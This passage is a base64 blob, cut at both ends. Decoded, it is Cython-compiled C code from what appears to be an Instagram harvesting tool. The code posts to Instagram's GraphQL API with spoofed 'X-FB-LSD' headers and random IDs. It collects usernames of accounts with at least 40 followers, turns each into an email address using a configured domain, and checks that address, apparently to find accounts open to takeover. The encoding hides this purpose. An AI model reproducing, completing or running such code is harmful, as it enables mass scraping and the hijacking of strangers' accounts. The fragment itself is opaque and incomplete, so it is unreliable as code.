91X2ssIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zMiwgX19weXhfdF83LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5NywgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF83KTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIH0KICAgIF9fcHl4X3RfNSA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfLCBfX3B5eF90XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sc2QsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogICAgCiAgICBfX3B5eF90XzIgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzk4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kdW1wcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDM5OCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgIAogICAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzOTksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM5OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzk5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzOTksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzOTksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZCwgX19weXhfdF82KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXJfc3VyZmFjZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BST0ZJTEUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzk5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fcHl4X3RfOCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfMik7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF84ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF90Xzd9OwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzOTgsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgIH0KICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YXJpYWJsZXMsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG9jX2lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI1NjE4MjYxODQxMTUwODQwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5NywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2RhdGEsICgoUHlPYmplY3QqKV9fcHl4X3RfMSkpOwogICAgX19weXhfdF8xID0gMDsKCiAgICAKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgX19weXhfdF81ID0gX19QeXhfUHlEaWN0X0dldEl0ZW0oX19weXhfdl9kYXRhLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbHNkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0ZCX0xTRCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfaGVhZGVycywgKChQeU9iamVjdCopX19weXhfdF8xKSk7CiAgICBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgewogICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF85LCAmX19weXhfdF8xMCwgJl9fcHl4X3RfMTEpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF84ID0gMTsKICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNykpKSB7CiAgICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzcpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNyk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzcsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX3B5eF90XzggPSAwOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMiA6IDApXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fYXBpX2dyYXB9OwogICAgICAgICAgX19weXhfdF80ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF80LCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNCk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF90XzEpOwogICAgICAgIF9fcHl4X3RfMSA9IDA7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3ZfcmVzcG9uc2U7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgxLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQwOCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgICB9CiAgICAgICAgX19weXhfdF81ID0gX19weXhfdF8yOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDA4LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICBfX3B5eF90XzggPSAwOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF90XzZ9OwogICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMy1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDA4LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzcgPSBfX3B5eF90XzQ7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MDgsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICAgIF9fcHl4X3RfOCA9IDA7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsIF9fcHl4X3RfMn07CiAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgzLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MDgsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfYWNjb3VudCwgX19weXhfdF8xKTsKICAgICAgICBfX3B5eF90XzEgPSAwOwoKICAgICAgICAKICAgICAgICBfX3B5eF90XzQgPSBfX3B5eF92X2FjY291bnQ7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcm5hbWV9OwogICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfMSk7CiAgICAgICAgX19weXhfdF8xID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF92X3VzZXJuYW1lKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEyIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDEwLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICBpZiAoX19weXhfdF8xMikgewoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X2FjY291bnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MTEsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MTEsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfZm9sbG93ZXJzLCBfX3B5eF90XzQpOwogICAgICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfZm9sbG93ZXJzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MTIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTIgPCAwKSkpIF9fUFlYX0VSUigwLCA0MTIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBpZiAoX19weXhfdF8xMikgewoKICAgICAgICAgICAgCiAgICAgICAgICAgIGdvdG8gX19weXhfTDExX3RyeV9jb250aW51ZTsKCiAgICAgICAgICAgIAogICAgICAgICAgfQoKICAgICAgICAgIAogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MTQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICBpZiAodW5saWtlbHkoKFB5T2JqZWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2FjY291bnQpIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDE0LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MTUsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3RweSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQxNSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgX19weXhfdF80ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQxNSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9lbWFpbCwgX19weXhfdF80KTsKICAgICAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzEgPSBOVUxMOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVjayk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQxNiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgICAgIF9fcHl4X3RfOCA9IDE7CiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8yKSkpIHsKICAgICAgICAgICAgX19weXhfdF8